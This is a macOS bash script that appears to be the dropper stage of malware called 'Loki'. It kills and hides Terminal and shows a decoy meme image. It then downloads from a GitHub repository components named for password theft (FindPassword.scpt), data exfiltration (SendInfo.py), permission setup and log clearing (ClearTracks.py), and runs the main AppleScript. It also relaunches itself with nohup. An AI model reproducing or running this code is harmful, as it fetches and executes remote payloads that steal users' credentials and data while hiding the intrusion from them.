#!/bin/bash

DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
me=`basename "$0"`
DIR+="/"
DIR+="$me"
echo "$DIR"

dupe_script=$(ps -ef | grep "$DIR" | grep -v grep | wc -l | xargs)
if [ ${dupe_script} -gt 2 ]; then
	killall Terminal
	echo "$(osascript -e "tell application 'Terminal' to set visible of every window 1 to false")"
	echo "$(/usr/bin/python -c 'import os; import time; import urllib; os.mkdir ("/Users/Shared/Loki"); time.sleep (1); urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/meme.jpg", "/Users/Shared/Loki/meme.jpg")')"
open /Users/Shared/Loki/meme.jpg
	echo "$(/usr/bin/python -c 'import urllib; urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/SystemIcon.png", "/Users/Shared/Loki/SystemIcon.png") ; urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/OneNote.png", "/Users/Shared/Loki/OneNote.png") ; urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/Lock.png", "/Users/Shared/Loki/Lock.png") ; urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/FindPassword.scpt", "/Users/Shared/Loki/FindPassword.scpt") ; urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/SendInfo.py", "/Users/Shared/Loki/SendInfo.py") ; urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/SetupPermissions.scpt", "/Users/Shared/Loki/SetupPermissions.scpt") ; urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/ClearTracks.py", "/Users/Shared/Loki/ClearTracks.py") ; urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/main.scpt", "/Users/Shared/Loki/main.scpt")')"
	echo "$DIR" > /Users/Shared/Loki/ToSend.txt
	osascript /Users/Shared/Loki/main.scpt
else
    nohup "$DIR"
fi